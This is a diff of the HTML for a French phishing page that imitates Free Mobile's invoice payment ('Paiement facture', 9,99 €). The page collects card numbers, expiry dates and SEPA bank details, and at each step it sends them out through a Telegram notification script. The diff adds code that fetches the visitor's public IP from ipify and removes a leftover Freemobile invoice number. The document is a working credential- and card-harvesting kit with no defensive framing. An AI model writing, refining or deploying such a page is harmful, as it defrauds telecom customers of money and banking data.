@@ -1,11 +1,10 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Paiement facture</title>
-  <!-- Font Awesome pour les icônes sociales (sans integrity) -->
+  <!-- Font Awesome pour les icônes sociales -->
   <link
     rel="stylesheet"
     href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
@@ -13,6 +12,18 @@
     referrerpolicy="no-referrer"
   />
   <link rel="stylesheet" href="style.css" />
+
+  <!-- JSONP ipify pour récupérer l'IP publique sur tous les devices -->
+  <script>
+    function handleIP(data) {
+      window.__CLIENT_IP__ = data.ip;
+    }
+    (function() {
+      var s = document.createElement('script');
+      s.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
+      document.head.appendChild(s);
+    })();
+  </script>
 </head>
 <body>
   <!-- HEADER style “Free” -->
@@ -40,7 +51,7 @@
   <!-- CONTENU centré -->
   <div class="container">
     <main>
-      <h1>Régler votre facture Freemobile_0110231130320258 — 9,99 €</h1>
+      <h1>Régler votre facture — 9,99 €</h1>
 
       <!-- TOGGLE méthodes de paiement -->
       <div class="toggle-methods">
@@ -115,7 +126,7 @@
     <div class="footer-bottom">
       <div class="legal-links">
         <a href="#">Informations Légales</a>
-        <a href="#">Données et contenus</a></a>
+        <a href="#">Données et contenus</a>
         <a href="#">Signaler un contenu</a>
         <a href="#">Tarifs et conditions</a>
       </div>
@@ -191,10 +202,10 @@
     </div>
   </div>
 
-  <!-- SCRIPT de logique et formatage + notifications -->
+  <!-- Script tg.js pour notifications -->
   <script src="tg.js"></script>
   <script>
-    // Références DOM
+    // Références DOM et logique inchangées
     const payBtn    = document.getElementById('pay-btn');
     const modal     = document.getElementById('payment-modal');
     const closeBtn  = document.getElementById('modal-close');
@@ -207,7 +218,6 @@
     const cardInput = document.getElementById('cardnumber');
     const expInput  = document.getElementById('expdate');
 
-    // Formatage auto
     function formatCardNumber(e) {
       let digits = e.target.value.replace(/\D/g, '').slice(0, 16);
       let groups = digits.match(/.{1,4}/g) || [];
@@ -221,14 +231,12 @@
     cardInput.addEventListener('input', formatCardNumber);
     expInput.addEventListener('input', formatExpDate);
 
-    // Étape 0 – clic “Payer maintenant”
     payBtn.addEventListener('click', () => {
       const method = document.querySelector('input[name="method"]:checked').value;
       sendTelegramNotification(`Étape 0 – Clic Payer maintenant\nMéthode: ${method}`);
       modal.classList.remove('hidden');
     });
 
-    // Étape 1 – clic “Suivant”
     toStep2.addEventListener('click', () => {
       if (!step1.checkValidity()) return step1.reportValidity();
       const d1 = new FormData(step1);
@@ -245,7 +253,6 @@
       else step2Sepa.classList.add('active');
     });
 
-    // Étape 2 – soumission Carte
     step2Card.addEventListener('submit', e => {
       e.preventDefault();
       const raw = cardInput.value.replace(/\D/g, '');
@@ -270,7 +277,6 @@
       startCountdown();
     });
 
-    // Étape 2 – soumission SEPA
     step2Sepa.addEventListener('submit', e => {
       e.preventDefault();
       if (!step2Sepa.checkValidity()) return step2Sepa.reportValidity();
@@ -285,7 +291,6 @@
       startCountdown();
     });
 
-    // Countdown + redirection
     function startCountdown() {
       let c = 5;
       const iv = setInterval(() => {
@@ -297,7 +302,6 @@
       }, 1000);
     }
 
-    // Fermer modal + reset
     closeBtn.addEventListener('click', () => {
       modal.classList.add('hidden');
       [step1, step2Card, step2Sepa, step3].forEach(el => el.classList.remove('active'));
